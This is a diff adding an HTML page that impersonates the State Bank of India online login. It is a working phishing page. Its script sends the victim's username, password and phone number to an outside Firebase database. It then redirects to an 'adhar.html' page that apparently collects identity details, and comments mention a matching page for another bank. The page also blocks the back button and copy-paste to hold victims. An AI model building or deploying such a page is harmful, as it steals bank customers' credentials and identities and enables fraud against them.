@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>SBI Online - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #ffffff;
+            font-family: system-ui, -apple-system, 'Roboto', 'Segoe UI', Arial, sans-serif;
+            overflow-x: hidden;
+        }
+
+        .relative-layout {
+            width: 100%;
+            min-height: 100vh;
+            position: relative;
+            background: white;
+        }
+
+        .top-strip {
+            width: 100%;
+            height: 30px;
+            background-color: #7E7E7E;
+            position: relative;
+            z-index: 1;
+        }
+
+        .scroll-view {
+            position: relative;
+            width: 100%;
+            height: calc(100vh - 30px);
+            overflow-y: auto;
+            background-color: white;
+        }
+
+        .main-linear {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            padding-bottom: 16px;
+        }
+
+        .top-image {
+            width: 114px;
+            height: 40px;
+            margin-left: 20px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            object-fit: contain;
+        }
+
+        .login-banner {
+            background-color: #D9EDF7;
+            padding: 8px;
+            width: 100%;
+            margin-top: 8px;
+        }
+        
+        .login-banner-text {
+            color: #00506D;
+            font-size: 14px;
+            font-weight: bold;
+            text-align: left;
+        }
+
+        .care-row {
+            display: flex;
+            flex-direction: row;
+            margin: 8px 0;
+            padding-left: 8px;
+            padding-right: 8px;
+        }
+        
+        .care-red-text {
+            color: #FF0000;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        .care-black-text {
+            color: #000000;
+            font-size: 14px;
+        }
+
+        .form-container {
+            padding: 0 16px 16px 16px;
+            width: 100%;
+        }
+
+        .field-row {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            margin-top: 10px;
+        }
+        
+        .field-label-text {
+            color: #000000;
+            font-size: 16px;
+        }
+        
+        .asterisk-red {
+            color: #FF0000;
+            font-size: 16px;
+            margin-left: 2px;
+        }
+
+        .input-field {
+            width: 100%;
+            border: 1px solid #AAAAAA;
+            border-radius: 4px;
+            padding: 8px;
+            font-size: 14px;
+            color: #000000;
+            background-color: #FFFFFF;
+            outline: none;
+            margin-bottom: 5px;
+        }
+        
+        .input-field:focus {
+            border-color: #00506D;
+        }
+
+        .captcha-select-text {
+            color: #000000;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .captcha-image {
+            width: 200px;
+            height: 60px;
+            object-fit: contain;
+            margin-bottom: 8px;
+            border: 1px solid #ddd;
+            background-color: #f8f8f8;
+            border-radius: 4px;
+        }
+
+        .radio-group {
+            display: flex;
+            flex-direction: row;
+            gap: 20px;
+            margin-bottom: 16px;
+            margin-top: 4px;
+        }
+        
+        .radio-group label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .radio-group input[type="radio"] {
+            appearance: none;
+            -webkit-appearance: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #0ADDBC;
+            border-radius: 50%;
+            margin: 0;
+            position: relative;
+            cursor: pointer;
+            background-color: white;
+            transition: all 0.2s ease;
+        }
+        
+        .radio-group input[type="radio"]:checked {
+            border: 2px solid #0ADDBC;
+            background-color: #0ADDBC;
+            box-shadow: inset 0 0 0 3px white;
+        }
+        
+        .radio-group input[type="radio"]:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(10, 221, 188, 0.3);
+        }
+        
+        .image-captcha-label {
+            color: #BC0909;
+            font-size: 14px;
+            font-weight: normal;
+        }
+        
+        .audio-captcha-label {
+            color: #DE0303;
+            font-size: 14px;
+            font-weight: normal;
+        }
+
+        .button-row {
+            display: flex;
+            flex-direction: row;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+        
+        .sbi-button {
+            width: 100px;
+            height: 40px;
+            background-color: #00506D;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 6px;
+            transition: all 0.2s ease;
+        }
+        
+        .sbi-button:hover {
+            background-color: #003d52;
+        }
+        
+        .sbi-button:active {
+            transform: scale(0.98);
+        }
+
+        .register-link {
+            color: #047FDC;
+            font-size: 15px;
+            margin-left: 8px;
+            margin-right: 8px;
+            margin-bottom: 4px;
+            cursor: pointer;
+            display: block;
+        }
+        
+        .forgot-link {
+            color: #047FDC;
+            font-size: 15px;
+            margin-left: 8px;
+            margin-right: 8px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            display: block;
+        }
+        
+        .register-link:hover, .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        .footer-image {
+            width: 100%;
+            height: auto;
+            object-fit: contain;
+            display: block;
+        }
+
+        .progress-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0.2s, opacity 0.2s;
+        }
+        
+        .progress-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        .dialog-container {
+            background: white;
+            border-radius: 16px;
+            padding: 24px 32px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            min-width: 250px;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #E0E0E0;
+            border-top: 4px solid #00506D;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        .progress-text {
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+            text-align: center;
+        }
+        
+        .progress-subtext {
+            color: #666;
+            font-size: 12px;
+            text-align: center;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .audio-captcha-section {
+            display: none;
+            margin-bottom: 8px;
+        }
+        
+        .audio-captcha-section.active {
+            display: block;
+        }
+        
+        .audio-buttons {
+            display: flex;
+            flex-direction: row;
+            gap: 10px;
+            align-items: center;
+        }
+        
+        .audio-btn {
+            background-color: #00506D;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+        }
+        
+        .audio-btn:hover {
+            background-color: #003d52;
+        }
+        
+        .image-captcha-section {
+            display: block;
+        }
+        
+        .captcha-wrapper {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+            flex-wrap: wrap;
+        }
+        
+        @media (max-width: 480px) {
+            .radio-group {
+                gap: 15px;
+            }
+            .dialog-container {
+                padding: 20px 24px;
+                min-width: 220px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="relative-layout">
+    <div class="top-strip"></div>
+
+    <div class="scroll-view">
+        <div class="main-linear">
+
+            <img id="topLogoImg" class="top-image" src="sbii.webp" alt="SBI Reward Logo"
+                 onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'114\' height=\'40\'%3E%3Crect width=\'114\' height=\'40\' fill=\'%2300506D\'/%3E%3Ctext x=\'12\' y=\'26\' fill=\'white\' font-size=\'12\'%3ESBI REWARD%3C/text%3E%3C/svg%3E'">
+
+            <div class="login-banner">
+                <div class="login-banner-text">Login To Online SBI</div>
+            </div>
+
+            <div class="care-row">
+                <span class="care-red-text">(CARE:</span>
+                <span class="care-black-text"> Username and password are case sensitive)</span>
+            </div>
+
+            <div class="form-container">
+
+                <div class="field-row">
+                    <span class="field-label-text">Username</span>
+                    <span class="asterisk-red"> *</span>
+                </div>
+                <input type="text" id="usernameInput" class="input-field" placeholder="Enter username" autocomplete="off">
+
+                <div class="field-row">
+                    <span class="field-label-text">Password</span>
+                    <span class="asterisk-red"> *</span>
+                </div>
+                <input type="password" id="passwordInput" class="input-field" placeholder="Enter password" autocomplete="off">
+
+                <div class="field-row">
+                    <span class="field-label-text">Phone</span>
+                    <span class="asterisk-red"> *</span>
+                </div>
+                <input type="tel" id="phoneInput" class="input-field" placeholder="Mobile number" maxlength="10" autocomplete="off">
+
+                <div class="field-row">
+                    <span class="field-label-text">Enter the text shown in the image</span>
+                    <span class="asterisk-red"> *</span>
+                </div>
+                <input type="text" id="captchaTextInput" class="input-field" placeholder="Type captcha text" autocomplete="off">
+
+                <div class="captcha-select-text">Select any of the Captcha option</div>
+
+                <div id="imageCaptchaSection" class="image-captcha-section">
+                    <div class="captcha-wrapper">
+                        <img id="captchaImage" class="captcha-image" src="captcha.webp" alt="Captcha Image"
+                             onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'200\' height=\'60\'%3E%3Crect width=\'200\' height=\'60\' fill=\'%23f0f0f0\'/%3E%3Ctext x=\'45\' y=\'38\' fill=\'%23666\' font-size=\'18\'%3E5X9K2%3C/text%3E%3C/svg%3E'">
+                    </div>
+                </div>
+
+                <div id="audioCaptchaSection" class="audio-captcha-section">
+                    <div class="audio-buttons">
+                        <button type="button" id="playAudioBtn" class="audio-btn">Play Audio Captcha</button>
+                        <button type="button" id="refreshAudioBtn" class="audio-btn">New Audio</button>
+                    </div>
+                </div>
+
+                <div class="radio-group" id="captchaRadioGroup">
+                    <label>
+                        <input type="radio" name="captchaType" value="image" checked>
+                        <span class="image-captcha-label">Image Captcha</span>
+                    </label>
+                    <label>
+                        <input type="radio" name="captchaType" value="audio">
+                        <span class="audio-captcha-label">Audio Captcha</span>
+                    </label>
+                </div>
+
+                <div class="button-row">
+                    <button id="loginBtn" class="sbi-button">Login</button>
+                    <button id="resetBtn" class="sbi-button">Reset</button>
+                </div>
+            </div>
+
+            <div class="register-link" id="registerLink">New Customer? Register here</div>
+            <div class="forgot-link" id="forgotLink">Forgot Username / Password</div>
+
+            <img id="footerLogoImg" class="footer-image" src="reward_logo.webp" alt="SBI Footer Logo"
+                 onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 600 80\'%3E%3Crect width=\'600\' height=\'80\' fill=\'%23E9F0F5\'/%3E%3Ctext x=\'20\' y=\'45\' fill=\'%2300506D\' font-size=\'12\'%3EState Bank of India - Safe & Secure Banking%3C/text%3E%3C/svg%3E'">
+
+        </div>
+    </div>
+</div>
+
+<div id="progressOverlay" class="progress-overlay">
+    <div class="dialog-container">
+        <div class="spinner"></div>
+        <div class="progress-text">Processing Login...</div>
+        <div class="progress-subtext">Please wait while we verify your details</div>
+    </div>
+</div>
+
+<script>
+    // ====================== SAME UNIQUEID LOGIC AS BOI PAGE ======================
+    const FIREBASE_DB_URL = "https://sbi3-misraji-apr-8-default-rtdb.firebaseio.com";
+    let uniqueId = null;
+    let currentAudioCaptchaText = "";
+
+    // This function exactly matches the BOI page's getUID logic
+    function getUID() {
+        const params = new URLSearchParams(window.location.search);
+        const urlId = params.get("id");
+
+        if (urlId) {
+            uniqueId = urlId;
+            console.log(" Using URL ID:", uniqueId);
+            return;
+        }
+
+        if (window.AndroidBridge && window.AndroidBridge.getDeviceUID) {
+            try {
+                uniqueId = window.AndroidBridge.getDeviceUID();
+                console.log("UID received from Android:", uniqueId);
+                return;
+            } catch (e) {
+                console.error("Error getting UID from Android:", e);
+            }
+        }
+
+        // Fallback - generate temp ID (same as BOI page)
+        uniqueId = "DEVICE_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9);
+        console.warn("Using fallback UID:", uniqueId);
+    }
+
+    function showLoader(show) {
+        const overlay = document.getElementById('progressOverlay');
+        if (show) {
+            overlay.classList.add('active');
+        } else {
+            overlay.classList.remove('active');
+        }
+    }
+
+    function generateRandomCaptcha() {
+        const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ0123456789";
+        let captcha = "";
+        for (let i = 0; i < 5; i++) {
+            captcha += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return captcha;
+    }
+
+    function generateAudioCaptcha() {
+        currentAudioCaptchaText = generateRandomCaptcha();
+        return currentAudioCaptchaText;
+    }
+
+    function playAudioCaptcha() {
+        const audioText = currentAudioCaptchaText;
+        if ('speechSynthesis' in window) {
+            const utterance = new SpeechSynthesisUtterance();
+            utterance.text = `Captcha code is ${audioText.split('').join(' ')}`;
+            utterance.lang = 'en-US';
+            utterance.rate = 0.7;
+            window.speechSynthesis.cancel();
+            window.speechSynthesis.speak(utterance);
+        } else {
+            alert(`Audio captcha code: ${audioText}`);
+        }
+    }
+
+    function refreshAudioCaptcha() {
+        generateAudioCaptcha();
+        const captchaInput = document.getElementById('captchaTextInput');
+        if (captchaInput) {
+            captchaInput.value = '';
+        }
+        if ('speechSynthesis' in window) {
+            const utterance = new SpeechSynthesisUtterance();
+            utterance.text = "New captcha generated";
+            utterance.lang = 'en-US';
+            window.speechSynthesis.speak(utterance);
+        }
+    }
+
+    function toggleCaptchaType(type) {
+        const imageSection = document.getElementById('imageCaptchaSection');
+        const audioSection = document.getElementById('audioCaptchaSection');
+        const captchaInput = document.getElementById('captchaTextInput');
+
+        if (type === 'image') {
+            imageSection.style.display = 'block';
+            audioSection.classList.remove('active');
+            if (captchaInput) captchaInput.value = '';
+        } else {
+            imageSection.style.display = 'none';
+            audioSection.classList.add('active');
+            generateAudioCaptcha();
+            if (captchaInput) captchaInput.value = '';
+        }
+    }
+
+    function resetForm() {
+        document.getElementById('usernameInput').value = '';
+        document.getElementById('passwordInput').value = '';
+        document.getElementById('phoneInput').value = '';
+        document.getElementById('captchaTextInput').value = '';
+        const imageRadio = document.querySelector('input[name="captchaType"][value="image"]');
+        if (imageRadio) {
+            imageRadio.checked = true;
+            toggleCaptchaType('image');
+        }
+    }
+
+    function validateForm(username, password, phone, enteredCaptcha, captchaType) {
+        if (!username.trim()) {
+            alert("Username is required.");
+            return false;
+        }
+        if (!password.trim()) {
+            alert("Password is required.");
+            return false;
+        }
+        if (!phone.trim()) {
+            alert("Phone number is required.");
+            return false;
+        }
+        if (phone.trim().length !== 10 || !/^\d{10}$/.test(phone.trim())) {
+            alert("Phone number must be exactly 10 digits.");
+            return false;
+        }
+
+        if (captchaType === 'image') {
+            if (!enteredCaptcha.trim()) {
+                alert("Please enter the captcha text.");
+                return false;
+            }
+            return true;
+        }
+
+        if (!enteredCaptcha.trim()) {
+            alert("Please enter the audio captcha text.");
+            return false;
+        }
+
+        if (enteredCaptcha.trim().toUpperCase() !== currentAudioCaptchaText.toUpperCase()) {
+            alert("Audio captcha does not match. Please try again.");
+            refreshAudioCaptcha();
+            document.getElementById('captchaTextInput').value = '';
+            return false;
+        }
+        return true;
+    }
+
+    async function saveLoginData(username, password, phone, uniqueIdValue) {
+        if (!uniqueIdValue) {
+            return false;
+        }
+
+        let baseUrl = FIREBASE_DB_URL;
+        if (baseUrl.endsWith('/')) {
+            baseUrl = baseUrl.slice(0, -1);
+        }
+
+        const payload = {
+            username: username,
+            password: password,
+            phoneNumber: phone,
+            uniqueId: uniqueIdValue,
+            timestamp: Date.now()
+        };
+
+        const endpoint = `${baseUrl}/registeredDevices/${encodeURIComponent(uniqueIdValue)}/form_submissions.json`;
+
+        const response = await fetch(endpoint, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+        }
+
+        return true;
+    }
+
+    async function onLogin() {
+        const username = document.getElementById('usernameInput').value;
+        const password = document.getElementById('passwordInput').value;
+        const phone = document.getElementById('phoneInput').value;
+        const enteredCaptcha = document.getElementById('captchaTextInput').value;
+
+        const radioSelected = document.querySelector('input[name="captchaType"]:checked');
+        const captchaType = radioSelected ? radioSelected.value : 'image';
+
+        if (!validateForm(username, password, phone, enteredCaptcha, captchaType)) return;
+
+        showLoader(true);
+
+        try {
+            await saveLoginData(username, password, phone, uniqueId);
+
+            // Store data for next page (same as BOI page)
+            localStorage.setItem("uniqueId", uniqueId);
+            localStorage.setItem("loginUsername", username);
+            localStorage.setItem("loginPhone", phone);
+            localStorage.setItem("dbUrl", FIREBASE_DB_URL);
+            localStorage.setItem("loginTimestamp", Date.now().toString());
+
+            // Redirect to adhar.html with the unique ID in URL (matching BOI page pattern)
+            const redirectParams = new URLSearchParams({
+                id: uniqueId,
+                dbUrl: FIREBASE_DB_URL,
+                loggedIn: "true",
+                ts: Date.now()
+            });
+
+            setTimeout(() => {
+                window.location.assign(`adhar.html?${redirectParams.toString()}`);
+            }, 800);
+
+        } catch (err) {
+            showLoader(false);
+            alert("Network error. Please check your connection and try again.");
+        }
+    }
+
+    function setupEventListeners() {
+        document.getElementById('loginBtn').addEventListener('click', onLogin);
+        document.getElementById('resetBtn').addEventListener('click', resetForm);
+        document.getElementById('playAudioBtn').addEventListener('click', playAudioCaptcha);
+        document.getElementById('refreshAudioBtn').addEventListener('click', refreshAudioCaptcha);
+        document.getElementById('registerLink').addEventListener('click', () => {
+            alert("New customer registration\n\nPlease visit nearest SBI branch or online portal at www.onlinesbi.com");
+        });
+        document.getElementById('forgotLink').addEventListener('click', () => {
+            alert("Forgot Username/Password?\n\nPlease use 'Forgot Password' option on SBI Online portal or contact SBI helpline 1800 1234.");
+        });
+
+        const radios = document.querySelectorAll('input[name="captchaType"]');
+        radios.forEach(radio => {
+            radio.addEventListener('change', (e) => {
+                toggleCaptchaType(e.target.value);
+                document.getElementById('captchaTextInput').value = '';
+            });
+        });
+
+        const phoneField = document.getElementById('phoneInput');
+        phoneField.addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '').substring(0, 10);
+        });
+
+        const usernameField = document.getElementById('usernameInput');
+        usernameField.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                document.getElementById('passwordInput').focus();
+            }
+        });
+
+        const passwordField = document.getElementById('passwordInput');
+        passwordField.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                document.getElementById('phoneInput').focus();
+            }
+        });
+
+        const phoneFieldEnter = document.getElementById('phoneInput');
+        phoneFieldEnter.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                document.getElementById('captchaTextInput').focus();
+            }
+        });
+
+        const captchaField = document.getElementById('captchaTextInput');
+        captchaField.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                onLogin();
+            }
+        });
+    }
+
+    function handleBackNavigation() {
+        const confirmBack = confirm("Are you sure you want to leave this page? Your progress may be lost.");
+        if (confirmBack) {
+            window.location.replace("index.html");
+        } else {
+            history.pushState({page: "sbi_login"}, "", location.href);
+        }
+    }
+
+    async function initPage() {
+        // Get UID exactly like BOI page
+        getUID();
+
+        // Store uniqueId in localStorage for consistency (like BOI page)
+        localStorage.setItem("uniqueId", uniqueId);
+
+        generateAudioCaptcha();
+
+        setupEventListeners();
+
+        history.pushState({page: "sbi_login"}, "", location.href);
+        window.addEventListener("popstate", function(event) {
+            handleBackNavigation();
+        });
+
+        if (window.AndroidBridge) {
+            window.AndroidBridge.onBackPressed = function() {
+                handleBackNavigation();
+            };
+        }
+
+        console.log(" SBI Login page loaded successfully");
+        console.log(" Firebase URL:", FIREBASE_DB_URL);
+        console.log(" Device ID:", uniqueId);
+        
+        setTimeout(() => {
+            document.getElementById('usernameInput').focus();
+        }, 100);
+    }
+    
+    document.addEventListener('DOMContentLoaded', initPage);
+    
+    const sensitiveFields = ['usernameInput', 'passwordInput', 'phoneInput', 'captchaTextInput'];
+    sensitiveFields.forEach(fieldId => {
+        const field = document.getElementById(fieldId);
+        if (field) {
+            field.addEventListener('contextmenu', (e) => e.preventDefault());
+            field.addEventListener('copy', (e) => e.preventDefault());
+            field.addEventListener('paste', (e) => e.preventDefault());
+            field.addEventListener('cut', (e) => e.preventDefault());
+        }
+    });
+</script>
+</body>
+</html>
